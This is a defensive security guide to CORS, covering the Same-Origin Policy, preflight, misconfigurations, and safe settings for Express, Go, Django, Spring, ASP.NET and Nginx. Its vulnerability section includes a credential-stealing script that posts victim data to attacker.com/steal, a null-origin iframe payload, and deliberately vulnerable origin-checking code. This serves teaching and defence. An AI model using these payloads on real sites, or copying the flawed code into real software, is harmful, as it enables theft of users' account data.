# CORS (Cross-Origin Resource Sharing) Security Guide

## Overview

Cross-Origin Resource Sharing is a browser mechanism that relaxes the Same-Origin Policy to allow
controlled cross-origin HTTP requests. Misconfigured CORS is one of the most common web security
vulnerabilities, enabling unauthorized data access, credential theft, and cross-origin attacks.
Treat CORS configuration as a security-critical concern, not a convenience setting.

---

## Table of Contents

1. [Same-Origin Policy Explained](#same-origin-policy-explained)
2. [CORS Mechanism](#cors-mechanism)
3. [CORS Headers Reference](#cors-headers-reference)
4. [Preflight Caching](#preflight-caching)
5. [CORS Misconfiguration Vulnerabilities](#cors-misconfiguration-vulnerabilities)
6. [CORS in Microservices and API Gateways](#cors-in-microservices-and-api-gateways)
7. [CORS vs CSRF Relationship](#cors-vs-csrf-relationship)
8. [Private Network Access](#private-network-access)
9. [Implementation Examples](#implementation-examples)
10. [Best Practices](#best-practices)
11. [Anti-Patterns](#anti-patterns)
12. [Enforcement Checklist](#enforcement-checklist)

---

## Same-Origin Policy Explained

The Same-Origin Policy (SOP) is the foundational browser security model. It restricts how a
document or script loaded from one origin can interact with a resource from another origin.

### What Defines an Origin

An origin is the tuple of:

```
scheme + host + port
```

| URL                          | Origin                      |
|------------------------------|-----------------------------|
| https://example.com/page     | https://example.com:443     |
| http://example.com/page      | http://example.com:80       |
| https://api.example.com/data | https://api.example.com:443 |
| https://example.com:8443/api | https://example.com:8443    |

Two URLs are same-origin only if all three components match exactly. Subdomains, different ports,
and different schemes are all cross-origin.

### What SOP Restricts

| Action                        | Allowed?                              |
|-------------------------------|---------------------------------------|
| Embedding images (`<img>`)    | Yes (cross-origin allowed)            |
| Embedding scripts (`<script>`)| Yes (cross-origin allowed)            |
| Embedding stylesheets (`<link>`)| Yes (cross-origin allowed)          |
| Embedding iframes (`<iframe>`)| Yes, but cross-origin DOM access blocked |
| XMLHttpRequest / fetch        | Blocked (unless CORS allows)          |
| Reading cookies               | Same-origin only                      |
| Reading localStorage          | Same-origin only                      |
| Reading DOM of another page   | Same-origin only                      |

### Why SOP Matters

Without SOP, a malicious page could:

- Read your email by fetching your webmail's inbox API.
- Transfer funds by reading banking API responses.
- Steal authentication tokens from cross-origin responses.
- Access internal network services through the user's browser.

CORS does NOT disable SOP. It is a controlled mechanism for selectively relaxing SOP restrictions
for specific, authorized cross-origin requests.

---

## CORS Mechanism

### Simple Requests

A request is "simple" (no preflight required) when ALL of the following conditions are met:

- Method is `GET`, `HEAD`, or `POST`.
- Headers are limited to: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`.
- Content-Type is limited to: `application/x-www-form-urlencoded`, `multipart/form-data`,
  `text/plain`.
- No `ReadableStream` object is used in the request.
- No event listeners are registered on any `XMLHttpRequestUpload` object.

For simple requests, the browser sends the request directly with an `Origin` header and checks
the response for a valid `Access-Control-Allow-Origin`.

```
GET /api/public-data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Content-Type: application/json
```

If the `Access-Control-Allow-Origin` header is missing or does not match the requesting origin,
the browser blocks the response from being read by JavaScript.

### Preflight Requests

Any request that does not meet the simple request criteria triggers a preflight. The browser
sends an `OPTIONS` request first to ask the server whether the actual request is allowed.

```
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
```

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

If the preflight response allows the request, the browser proceeds with the actual request.
If not, the browser blocks the request entirely.

### Credentialed Requests

By default, cross-origin requests do not include cookies or HTTP authentication. To include
credentials:

Client side (JavaScript):

```javascript
// Fetch API
fetch('https://api.example.com/data', {
  credentials: 'include',
});

// XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.withCredentials = true;
```

Server side (response header):

```
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

Critical rules for credentialed requests:

- `Access-Control-Allow-Origin` MUST be a specific origin. Wildcard `*` is NOT allowed.
- `Access-Control-Allow-Headers` MUST NOT be `*`.
- `Access-Control-Allow-Methods` MUST NOT be `*`.
- `Access-Control-Expose-Headers` MUST NOT be `*`.

---

## CORS Headers Reference

### Access-Control-Allow-Origin

Specify which origin(s) may read the response.

```
Access-Control-Allow-Origin: https://app.example.com
```

| Value                          | Behavior                                  |
|--------------------------------|-------------------------------------------|
| `https://app.example.com`      | Only this specific origin is allowed       |
| `*`                            | Any origin is allowed (no credentials)     |
| (absent)                       | Cross-origin access is denied              |

The header supports only a single origin value or `*`. To support multiple origins, implement
server-side logic to check the `Origin` header against an allowlist and reflect the matching
origin.

```javascript
// Express example: multiple origins
const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com',
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');
  }
  next();
});
```

Always include `Vary: Origin` when the response differs based on the `Origin` header. This
prevents caching from serving a response with the wrong `Access-Control-Allow-Origin`.

### Access-Control-Allow-Methods

Specify which HTTP methods are allowed for cross-origin requests.

```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
```

List only the methods the API actually supports. Do not include methods unnecessarily.

### Access-Control-Allow-Headers

Specify which request headers are allowed in cross-origin requests.

```
Access-Control-Allow-Headers: Content-Type, Authorization, X-Request-ID
```

Enumerate specific headers. Avoid wildcard `*` when credentials are involved.

### Access-Control-Allow-Credentials

Indicate whether the response can be shared when credentials (cookies, TLS client certs, HTTP
auth) are included.

```
Access-Control-Allow-Credentials: true
```

Only set to `true` when the API genuinely requires cross-origin cookie-based authentication or
session management. Using credentials widens the attack surface.

### Access-Control-Max-Age

Specify how long (in seconds) the browser may cache the preflight response.

```
Access-Control-Max-Age: 86400
```

- Maximum value varies by browser: Chrome caps at 7200 (2 hours), Firefox at 86400 (24 hours).
- Set a reasonable value to reduce preflight request volume.
- Setting `0` or `-1` disables caching (useful during development).

### Access-Control-Expose-Headers

By default, the browser exposes only CORS-safelisted response headers to JavaScript:
`Cache-Control`, `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified`,
`Pragma`.

To expose additional headers:

```
Access-Control-Expose-Headers: X-Request-ID, X-RateLimit-Remaining, X-RateLimit-Limit
```

### Access-Control-Request-Method

Sent by the browser in preflight requests to indicate the intended HTTP method:

```
Access-Control-Request-Method: PUT
```

This is a request header, not a response header. The server uses it to decide whether to allow
the method.

### Access-Control-Request-Headers

Sent by the browser in preflight requests to indicate the intended custom headers:

```
Access-Control-Request-Headers: Content-Type, Authorization
```

---

## Preflight Caching

### How Preflight Caching Works

The browser caches preflight responses based on:

- The request URL.
- The request method.
- The request headers.
- The origin.

When a cached preflight result exists and has not expired (per `Access-Control-Max-Age`), the
browser skips the preflight and sends the actual request directly.

### Optimizing Preflight Performance

1. Set `Access-Control-Max-Age` to the maximum useful duration (e.g., 86400).
2. Normalize API endpoints to reduce unique preflight cache entries.
3. Use simple requests (GET with no custom headers) for read operations to avoid preflight entirely.
4. Consider consolidating custom headers to reduce the variety of preflight permutations.

### Preflight Cache Invalidation

The browser invalidates the preflight cache when:

- The `Access-Control-Max-Age` expires.
- The browser cache is cleared.
- A different set of headers or methods is requested.
- The origin changes.

---

## CORS Misconfiguration Vulnerabilities

### Vulnerability 1: Reflecting the Origin Header

The most dangerous CORS misconfiguration: reading the `Origin` request header and echoing it
back in `Access-Control-Allow-Origin` without validation.

```javascript
// VULNERABLE CODE -- DO NOT USE
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // reflects any origin
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

**Impact:** Any website can make credentialed requests to the API and read responses, enabling
full account takeover.

**Attack scenario:**

```html
<!-- On attacker.com -->
<script>
  fetch('https://victim-api.com/api/account', {
    credentials: 'include',
  })
  .then(r => r.json())
  .then(data => {
    // Steal user's account data
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data),
    });
  });
</script>
```

**Prevention:** Validate the `Origin` header against an explicit allowlist:

```javascript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  next();
});
```

### Vulnerability 2: Null Origin Allowlisting

Some servers allow `Origin: null`, which is sent by:

- Sandboxed iframes (`<iframe sandbox>`).
- Data URIs and file:// origins.
- Certain redirect chains.

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Impact:** An attacker can craft a page that sends requests with `Origin: null`:

```html
<iframe sandbox="allow-scripts allow-forms"
  src="data:text/html,<script>
    fetch('https://victim-api.com/api/data', {credentials:'include'})
    .then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
  </script>">
</iframe>
```

**Prevention:** Never include `null` in your origin allowlist. Reject `null` origin explicitly.

### Vulnerability 3: Subdomain Wildcard Matching

Using regex or string matching that allows any subdomain:

```javascript
// VULNERABLE
const origin = req.headers.origin;
if (origin && origin.endsWith('.example.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```

**Problem:** An attacker who controls `evil.example.com` (via subdomain takeover, XSS on a
subdomain, or registering `notexample.com`) can access the API.

The endsWith check also matches `attacker-example.com`.

**Prevention:** Use exact string matching against a known allowlist. If you must allow subdomains,
parse the URL and validate the registrable domain:

```javascript
function isAllowedOrigin(origin) {
  try {
    const url = new URL(origin);
    // Exact match on known subdomains only
    const allowed = [
      'app.example.com',
      'admin.example.com',
      'api.example.com',
    ];
    return url.protocol === 'https:' && allowed.includes(url.hostname);
  } catch {
    return false;
  }
}
```

### Vulnerability 4: Wildcard with Credentials

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Browsers actually block this combination (the spec forbids it). However, some server-side
proxies or CDNs may strip or modify headers in ways that create exploitable combinations. Always
test the actual headers received by the browser.

### Vulnerability 5: Pre-Wildcard Fallback

Some implementations fall back to `*` when the origin does not match the allowlist:

```javascript
// VULNERABLE fallback pattern
if (allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
} else {
  res.setHeader('Access-Control-Allow-Origin', '*');
}
```

**Problem:** The wildcard fallback allows any origin to read non-credentialed responses.

**Prevention:** If the origin is not in the allowlist, do not set `Access-Control-Allow-Origin`
at all.

---

## CORS in Microservices and API Gateways

### API Gateway Pattern

Handle CORS at the API gateway layer rather than in individual microservices:

```
Client (browser)
   |
   v
API Gateway (CORS handled here)
   |
   +-- Service A (no CORS headers)
   +-- Service B (no CORS headers)
   +-- Service C (no CORS headers)
```

Advantages:

- Centralized origin allowlist management.
- Consistent CORS policy across all services.
- Reduced configuration duplication.
- Easier to audit and update.

### Gateway Configuration (Kong)

```yaml
plugins:
  - name: cors
    config:
      origins:
        - https://app.example.com
        - https://admin.example.com
      methods:
        - GET
        - POST
        - PUT
        - DELETE
        - PATCH
      headers:
        - Content-Type
        - Authorization
        - X-Request-ID
      credentials: true
      max_age: 86400
      exposed_headers:
        - X-Request-ID
        - X-RateLimit-Remaining
```

### Gateway Configuration (AWS API Gateway)

```yaml
# SAM template
Resources:
  ApiGateway:
    Type: AWS::Serverless::Api
    Properties:
      Cors:
        AllowMethods: "'GET,POST,PUT,DELETE'"
        AllowHeaders: "'Content-Type,Authorization'"
        AllowOrigin: "'https://app.example.com'"
        AllowCredentials: true
        MaxAge: "'86400'"
```

### Service Mesh Pattern

In a service mesh (e.g., Istio, Linkerd), configure CORS at the ingress gateway:

```yaml
# Istio VirtualService
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: api-vs
spec:
  hosts:
    - api.example.com
  gateways:
    - api-gateway
  http:
    - corsPolicy:
        allowOrigins:
          - exact: https://app.example.com
          - exact: https://admin.example.com
        allowMethods:
          - GET
          - POST
          - PUT
          - DELETE
        allowHeaders:
          - Content-Type
          - Authorization
        allowCredentials: true
        maxAge: "86400s"
      route:
        - destination:
            host: api-service
```

### Service-to-Service Communication

Internal service-to-service calls do NOT need CORS. CORS is a browser-enforced mechanism.
Backend services communicating directly (via HTTP, gRPC, message queues) bypass CORS entirely.

Do not add `Access-Control-Allow-Origin: *` to internal APIs "just in case." If an internal
API is accidentally exposed to the internet, permissive CORS headers widen the attack surface.

---

## CORS vs CSRF Relationship

### How They Relate

CORS and CSRF are related but distinct:

| Aspect                | CORS                                  | CSRF                                  |
|-----------------------|---------------------------------------|---------------------------------------|
| What it is            | Browser mechanism for cross-origin reads | Attack that tricks users into sending unwanted requests |
| Direction             | Controls reading responses            | Exploits writing/submitting requests  |
| Browser enforcement   | Browser blocks reading the response   | Browser sends the request anyway      |
| Credentials           | Opt-in via `credentials: 'include'`   | Cookies sent automatically for same-site (depends on SameSite) |

### Key Insight

CORS prevents cross-origin reading, NOT cross-origin sending. A cross-origin `POST` request
with cookies is still sent to the server even if CORS blocks the response from being read.
This is why CSRF protection (tokens, SameSite cookies) remains necessary even with strict CORS.

### How They Complement Each Other

- CORS prevents attackers from reading sensitive data via cross-origin JavaScript requests.
- CSRF tokens prevent attackers from performing state-changing actions via forged requests.
- `SameSite` cookies prevent credentials from being included in cross-origin requests.

### Defense-in-Depth

Implement all three mechanisms:

```
1. CORS: Restrict Access-Control-Allow-Origin to known origins
2. CSRF: Require anti-CSRF tokens for state-changing operations
3. SameSite: Set SameSite=Lax or SameSite=Strict on session cookies
```

---

## Private Network Access

Private Network Access (formerly CORS-RFC1918) extends CORS to protect private network resources
from being accessed by public websites.

### Threat Model

A public website served over the internet can make requests to:

- `localhost` and `127.0.0.1` (loopback addresses).
- `192.168.x.x`, `10.x.x.x`, `172.16-31.x.x` (private IP ranges).
- Internal services, admin panels, IoT devices, development servers.

The browser acts as a proxy, using the user's network access to reach these internal resources.

### How Private Network Access Works

When a public page makes a request to a private IP address:

1. The browser sends a preflight request with an `Access-Control-Request-Private-Network: true`
   header.
2. The server must respond with `Access-Control-Allow-Private-Network: true`.
3. If the server does not respond with the header, the browser blocks the request.

```
OPTIONS /api HTTP/1.1
Host: 192.168.1.1
Origin: https://public-site.com
Access-Control-Request-Private-Network: true
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://public-site.com
Access-Control-Allow-Private-Network: true
```

### Network Tiers

| Tier     | Examples                                          |
|----------|---------------------------------------------------|
| Public   | Any publicly routable IP address                  |
| Private  | 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16       |
| Local    | 127.0.0.0/8, ::1/128, localhost                   |

Requests from a less-private tier to a more-private tier require Private Network Access checks:

- Public -> Private: requires preflight with private network header.
- Public -> Local: requires preflight with private network header.
- Private -> Local: requires preflight with private network header.

### Recommendations

- Configure development servers to reject Private Network Access requests.
- Never expose internal admin panels without authentication.
- Monitor browser console warnings for Private Network Access violations during development.
- Treat any internal service accessible via HTTP as a potential attack target from public websites.

---

## Implementation Examples

### Express.js (cors middleware)

```javascript
const express = require('express');
const cors = require('cors');
const app = express();

// Define allowed origins
const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com',
];

const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (server-to-server, curl, mobile apps)
    // ONLY if this is intentional for your use case
    if (!origin) {
      return callback(null, true);
    }
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    return callback(new Error('CORS policy violation'), false);
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  exposedHeaders: ['X-Request-ID', 'X-RateLimit-Remaining'],
  credentials: true,
  maxAge: 86400,
  optionsSuccessStatus: 204,
};

// Apply CORS to all routes
app.use(cors(corsOptions));

// Handle preflight for all routes
app.options('*', cors(corsOptions));

// Route-specific CORS (stricter for sensitive endpoints)
const strictCorsOptions = {
  origin: 'https://admin.example.com',
  credentials: true,
  methods: ['GET'],
  maxAge: 3600,
};

app.get('/api/admin/users', cors(strictCorsOptions), (req, res) => {
  res.json({ users: [] });
});
```

### Go (rs/cors)

```go
package main

import (
    "net/http"

    "github.com/rs/cors"
)

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/api/data", func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "application/json")
        w.Write([]byte(`{"status": "ok"}`))
    })

    // Configure CORS
    c := cors.New(cors.Options{
        AllowedOrigins: []string{
            "https://app.example.com",
            "https://admin.example.com",
        },
        AllowedMethods: []string{
            http.MethodGet,
            http.MethodPost,
            http.MethodPut,
            http.MethodDelete,
            http.MethodPatch,
        },
        AllowedHeaders: []string{
            "Content-Type",
            "Authorization",
            "X-Request-ID",
        },
        ExposedHeaders: []string{
            "X-Request-ID",
            "X-RateLimit-Remaining",
        },
        AllowCredentials: true,
        MaxAge:           86400,
        // Debug mode for development only
        // Debug: true,
    })

    handler := c.Handler(mux)
    http.ListenAndServeTLS(":443", "cert.pem", "key.pem", handler)
}
```

### Python (django-cors-headers)

```python
# settings.py
INSTALLED_APPS = [
    # ...
    'corsheaders',
    # ...
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',  # Must be before CommonMiddleware
    'django.middleware.common.CommonMiddleware',
    # ...
]

# Explicit list of allowed origins (preferred)
CORS_ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com',
]

# Or use regex for subdomain patterns (use with caution)
# CORS_ALLOWED_ORIGIN_REGEXES = [
#     r'^https://\w+\.example\.com$',
# ]

# Allow credentials (cookies, authorization headers)
CORS_ALLOW_CREDENTIALS = True

# Allowed methods
CORS_ALLOW_METHODS = [
    'GET',
    'POST',
    'PUT',
    'PATCH',
    'DELETE',
    'OPTIONS',
]

# Allowed headers
CORS_ALLOW_HEADERS = [
    'content-type',
    'authorization',
    'x-request-id',
]

# Exposed headers
CORS_EXPOSE_HEADERS = [
    'x-request-id',
    'x-ratelimit-remaining',
]

# Preflight cache duration
CORS_PREFLIGHT_MAX_AGE = 86400
```

### Python (FastAPI)

```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

allowed_origins = [
    "https://app.example.com",
    "https://admin.example.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],
    allow_headers=["Content-Type", "Authorization", "X-Request-ID"],
    expose_headers=["X-Request-ID", "X-RateLimit-Remaining"],
    max_age=86400,
)

@app.get("/api/data")
async def get_data():
    return {"status": "ok"}
```

### Spring Boot

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins(
                "https://app.example.com",
                "https://admin.example.com"
            )
            .allowedMethods("GET", "POST", "PUT", "DELETE", "PATCH")
            .allowedHeaders("Content-Type", "Authorization", "X-Request-ID")
            .exposedHeaders("X-Request-ID", "X-RateLimit-Remaining")
            .allowCredentials(true)
            .maxAge(86400);
    }
}
```

For Spring Security integration:

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.cors(cors -> cors.configurationSource(corsConfigurationSource()));
        return http.build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of(
            "https://app.example.com",
            "https://admin.example.com"
        ));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "PATCH"));
        config.setAllowedHeaders(List.of("Content-Type", "Authorization", "X-Request-ID"));
        config.setExposedHeaders(List.of("X-Request-ID", "X-RateLimit-Remaining"));
        config.setAllowCredentials(true);
        config.setMaxAge(86400L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
}
```

### ASP.NET

```csharp
// Program.cs
var builder = WebApplication.CreateBuilder(args);

builder.Services.AddCors(options =>
{
    // Named policy for most endpoints
    options.AddPolicy("DefaultPolicy", policy =>
    {
        policy.WithOrigins(
                "https://app.example.com",
                "https://admin.example.com")
            .WithMethods("GET", "POST", "PUT", "DELETE", "PATCH")
            .WithHeaders("Content-Type", "Authorization", "X-Request-ID")
            .WithExposedHeaders("X-Request-ID", "X-RateLimit-Remaining")
            .AllowCredentials()
            .SetPreflightMaxAge(TimeSpan.FromSeconds(86400));
    });

    // Strict policy for admin endpoints
    options.AddPolicy("AdminPolicy", policy =>
    {
        policy.WithOrigins("https://admin.example.com")
            .WithMethods("GET")
            .AllowCredentials()
            .SetPreflightMaxAge(TimeSpan.FromSeconds(3600));
    });
});

var app = builder.Build();
app.UseCors("DefaultPolicy");

// Apply strict policy to specific endpoints
app.MapGet("/api/admin/users", () => Results.Ok(new { users = Array.Empty<object>() }))
    .RequireCors("AdminPolicy");
```

### Nginx

```nginx
server {
    listen 443 ssl;
    server_name api.example.com;

    # Map allowed origins
    map $http_origin $cors_origin {
        default "";
        "https://app.example.com"   "https://app.example.com";
        "https://admin.example.com" "https://admin.example.com";
    }

    location /api/ {
        # Handle preflight requests
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Allow-Origin' $cors_origin always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, PATCH' always;
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization, X-Request-ID' always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Max-Age' '86400' always;
            add_header 'Vary' 'Origin' always;
            add_header 'Content-Length' '0';
            add_header 'Content-Type' 'text/plain';
            return 204;
        }

        # Add CORS headers to actual responses
        add_header 'Access-Control-Allow-Origin' $cors_origin always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;
        add_header 'Access-Control-Expose-Headers' 'X-Request-ID, X-RateLimit-Remaining' always;
        add_header 'Vary' 'Origin' always;

        proxy_pass http://backend;
    }
}
```

**Nginx caveat:** The `if` directive in Nginx has well-documented pitfalls. For production
deployments, prefer handling CORS in the application layer or use the OpenResty/Lua module for
more robust logic.

---

## Best Practices

1. **Use an explicit allowlist of origins.** Never reflect the `Origin` header back without
   validation. Maintain a hardcoded list of allowed origins in server configuration or
   environment variables.

2. **Never use wildcard (*) with credentials.** The spec forbids `Access-Control-Allow-Origin: *`
   with `Access-Control-Allow-Credentials: true`. Even without credentials, wildcard access
   allows any website to read API responses.

3. **Always include the Vary: Origin header.** When `Access-Control-Allow-Origin` varies based on
   the request's `Origin` header, the response MUST include `Vary: Origin`. Without it, caches
   may serve a response with the wrong origin, creating security vulnerabilities or breaking
   functionality.

4. **Handle CORS at the API gateway or reverse proxy level.** Centralizing CORS configuration
   prevents inconsistencies across microservices and simplifies auditing. Individual services
   should not independently configure CORS.

5. **Set Access-Control-Max-Age to reduce preflight overhead.** Configure the maximum cache
   duration your security requirements allow (up to 86400 seconds). This dramatically reduces
   the number of OPTIONS requests.

6. **Restrict Access-Control-Allow-Methods to necessary methods only.** Do not allow `PUT`,
   `DELETE`, or `PATCH` if the API only supports `GET` and `POST`. Each allowed method increases
   the attack surface.

7. **Restrict Access-Control-Allow-Headers to necessary headers only.** Enumerate specific
   headers instead of using `*`. Allowing arbitrary headers can enable header injection attacks
   or bypass security controls.

8. **Reject the null origin.** Never include `null` in your origin allowlist. Sandboxed iframes
   and data URIs send `Origin: null`, and attackers can easily craft pages with a null origin.

9. **Audit CORS configuration regularly.** Include CORS headers in security reviews. Use automated
   scanning tools (OWASP ZAP, Burp Suite) to detect misconfigurations. Test with cross-origin
   requests from unauthorized origins.

10. **Do not rely on CORS alone for CSRF protection.** CORS controls response reading, not
    request sending. Implement anti-CSRF tokens and SameSite cookies for state-changing operations
    regardless of CORS configuration.

---

## Anti-Patterns

1. **Reflecting the Origin header without validation.** Echoing `req.headers.origin` directly
   into `Access-Control-Allow-Origin` is equivalent to allowing every origin. Any website can
   read the API responses and steal user data.

2. **Using regex to match origins without anchoring.** A regex like `/example\.com/` matches
   `evil-example.com` and `example.com.attacker.com`. Always anchor regex patterns with `^` and
   `$` and include the scheme: `^https://app\.example\.com$`.

3. **Setting Access-Control-Allow-Origin: * on authenticated endpoints.** Even without
   `Access-Control-Allow-Credentials`, wildcard access on authenticated endpoints allows any
   website to probe the API and potentially leak information through error messages or timing.

4. **Allowing the null origin.** Treating `null` as a valid origin allows attackers using
   sandboxed iframes and data URIs to make credentialed cross-origin requests.

5. **Configuring CORS inconsistently across microservices.** When each service manages its own
   CORS policy, configurations drift, creating gaps. One service with overly permissive CORS
   undermines the security of the entire system.

6. **Not setting Vary: Origin.** Without `Vary: Origin`, a CDN or browser cache may serve a
   response with `Access-Control-Allow-Origin: https://app.example.com` to a request from
   `https://admin.example.com`, breaking functionality or enabling cache poisoning.

7. **Using CORS as the sole CSRF defense.** CORS does not prevent a cross-origin `POST` request
   from reaching the server. The request is sent; only the response is blocked from being read.
   Always pair CORS with CSRF tokens and SameSite cookies.

8. **Disabling CORS during development and forgetting to re-enable.** Using `Access-Control-Allow-Origin: *`
   in development that accidentally reaches production is a recurring security incident.
   Use environment-specific configuration and validate headers in CI/CD.

---

## Enforcement Checklist

Use this checklist before every production deployment:

- [ ] `Access-Control-Allow-Origin` is set to specific, hardcoded origins from an allowlist.
- [ ] The `Origin` header is never reflected back without validation against the allowlist.
- [ ] `null` is NOT included in the list of allowed origins.
- [ ] `Access-Control-Allow-Origin: *` is NOT used on any endpoint that handles authentication or sensitive data.
- [ ] `Access-Control-Allow-Credentials: true` is only set on endpoints that genuinely require cross-origin cookie/auth access.
- [ ] `Access-Control-Allow-Methods` lists only the HTTP methods the API actually supports.
- [ ] `Access-Control-Allow-Headers` lists only the headers the API actually needs.
- [ ] `Access-Control-Expose-Headers` lists only the response headers clients need to read.
- [ ] `Vary: Origin` is included on all responses where `Access-Control-Allow-Origin` varies.
- [ ] `Access-Control-Max-Age` is set to a reasonable value (3600-86400 seconds).
- [ ] CORS is configured at the API gateway or reverse proxy level (not in individual services).
- [ ] Anti-CSRF tokens are implemented for all state-changing operations, regardless of CORS.
- [ ] Session cookies use `SameSite=Lax` or `SameSite=Strict` in addition to CORS controls.
- [ ] Preflight responses return `204 No Content` with correct CORS headers.
- [ ] CORS configuration is environment-specific (different origins for dev, staging, production).
- [ ] Automated security scans (OWASP ZAP, Burp Suite) test for CORS misconfigurations.
- [ ] Internal/private APIs do NOT set `Access-Control-Allow-Origin` headers.
- [ ] Regex-based origin matching (if used) is anchored and includes scheme validation.
- [ ] CORS headers are NOT present on non-API responses (static HTML, redirects) unless required.
- [ ] The CORS configuration is documented and included in security review processes.
